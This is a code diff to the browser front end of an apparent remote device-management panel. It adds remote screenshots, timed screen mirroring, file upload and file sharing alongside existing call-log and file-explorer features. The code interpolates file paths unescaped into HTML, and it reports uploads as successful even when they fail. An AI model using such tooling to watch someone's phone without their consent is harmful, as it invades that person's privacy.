@@ -6,6 +6,8 @@ class DeviceManager {
         this.map = null;
         this.currentPath = '/';
         this.pathHistory = [];
+        this.mirroringInterval = null;
+        this.isMirroring = false;
         this.init();
     }
 
@@ -39,6 +41,14 @@ class DeviceManager {
         document.getElementById('download-call-log').addEventListener('click', () => this.downloadCallLog());
         document.getElementById('refresh-files').addEventListener('click', () => this.requestFiles());
         document.getElementById('go-back').addEventListener('click', () => this.goBackDirectory());
+        
+        // Screen mirroring buttons
+        document.getElementById('take-screenshot').addEventListener('click', () => this.takeScreenshot());
+        document.getElementById('start-mirroring').addEventListener('click', () => this.startMirroring());
+        document.getElementById('stop-mirroring').addEventListener('click', () => this.stopMirroring());
+        
+        // File upload
+        document.getElementById('file-upload').addEventListener('change', (e) => this.handleFileUpload(e));
     }
 
     showSection(sectionName) {
@@ -68,7 +78,8 @@ class DeviceManager {
             'apps': 'Installed Apps',
             'permissions': 'Allowed Permissions',
             'file-explorer': 'File Explorer',
-            'downloads': 'Downloads'
+            'downloads': 'Downloads',
+            'screen': 'Screen Mirror'
         };
         document.getElementById('content-title').textContent = titles[sectionName] || 'Device Manager';
 
@@ -480,6 +491,11 @@ class DeviceManager {
                                                 title="Download">
                                             <i class="fas fa-download"></i>
                                         </button>
+                                        <button onclick="event.stopPropagation(); deviceManager.shareFile('${file.path}')" 
+                                                class="text-green-600 hover:text-green-700 p-2 rounded-lg hover:bg-green-50 transition-colors" 
+                                                title="Share">
+                                            <i class="fas fa-share"></i>
+                                        </button>
                                     ` : ''}
                                     ${file.type === 'folder' ? `
                                         <i class="fas fa-chevron-right text-gray-400"></i>
@@ -563,6 +579,123 @@ class DeviceManager {
         return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
     }
 
+    async takeScreenshot() {
+        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
+            alert('Device is not available');
+            return;
+        }
+
+        try {
+            const response = await fetch(`/api/devices/${this.currentDeviceId}/screenshot`, {
+                method: 'POST'
+            });
+            const result = await response.json();
+            
+            if (result.success) {
+                document.getElementById('screen-display').innerHTML = `
+                    <div class="text-center">
+                        <i class="fas fa-spinner fa-spin text-blue-600 text-2xl mb-2 block"></i>
+                        <p class="text-sm text-gray-500">Taking screenshot...</p>
+                    </div>
+                `;
+                
+                // Check for screenshot after delay
+                setTimeout(() => this.checkForScreenshot(), 2000);
+            }
+        } catch (error) {
+            console.error('Error taking screenshot:', error);
+            alert('Failed to take screenshot');
+        }
+    }
+
+    async checkForScreenshot() {
+        if (!this.currentDeviceId) return;
+        
+        try {
+            const response = await fetch(`/api/devices/${this.currentDeviceId}/latest-screenshot`);
+            if (response.ok) {
+                const blob = await response.blob();
+                const imageUrl = URL.createObjectURL(blob);
+                
+                document.getElementById('screen-display').innerHTML = `
+                    <img src="${imageUrl}" alt="Device Screenshot" class="max-w-full max-h-full object-contain rounded-lg">
+                `;
+            }
+        } catch (error) {
+            console.error('Error loading screenshot:', error);
+        }
+    }
+
+    startMirroring() {
+        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
+            alert('Device is not available');
+            return;
+        }
+
+        this.isMirroring = true;
+        document.getElementById('start-mirroring').style.display = 'none';
+        document.getElementById('stop-mirroring').style.display = 'inline-flex';
+        
+        const refreshRate = parseInt(document.getElementById('refresh-rate').value);
+        
+        // Start continuous screenshots
+        this.mirroringInterval = setInterval(() => {
+            if (this.isMirroring) {
+                this.takeScreenshot();
+            }
+        }, refreshRate);
+        
+        // Take initial screenshot
+        this.takeScreenshot();
+    }
+
+    stopMirroring() {
+        this.isMirroring = false;
+        
+        if (this.mirroringInterval) {
+            clearInterval(this.mirroringInterval);
+            this.mirroringInterval = null;
+        }
+        
+        document.getElementById('start-mirroring').style.display = 'inline-flex';
+        document.getElementById('stop-mirroring').style.display = 'none';
+    }
+
+    async handleFileUpload(event) {
+        const files = event.target.files;
+        if (!files.length || !this.currentDeviceId || !this.selectedDevice?.isOnline) {
+            alert('Device is not available for file upload');
+            return;
+        }
+
+        for (const file of files) {
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('targetPath', this.currentPath);
+
+            try {
+                const response = await fetch(`/api/devices/${this.currentDeviceId}/upload-file`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                if (result.success) {
+                    console.log(`File ${file.name} uploaded successfully`);
+                } else {
+                    console.error(`Failed to upload ${file.name}`);
+                }
+            } catch (error) {
+                console.error(`Error uploading ${file.name}:`, error);
+            }
+        }
+        
+        // Clear the input and refresh files
+        event.target.value = '';
+        setTimeout(() => this.requestFiles(), 1000);
+        alert('Files uploaded successfully');
+    }
+
     async browseDirectory(path) {
         if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
             alert('Device is not available for browsing');
@@ -642,6 +775,31 @@ class DeviceManager {
         .catch(error => {
             console.error('Error requesting file download:', error);
             alert('Failed to request file download');
+        });
+    }
+
+    shareFile(filePath) {
+        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
+            alert('Device is not available for file sharing');
+            return;
+        }
+        
+        fetch(`/api/devices/${this.currentDeviceId}/share-file`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ filePath })
+        })
+        .then(response => response.json())
+        .then(result => {
+            if (result.success) {
+                alert('File shared successfully');
+            } else {
+                alert('Failed to share file');
+            }
+        })
+        .catch(error => {
+            console.error('Error sharing file:', error);
+            alert('Failed to share file');
         });
     }
 
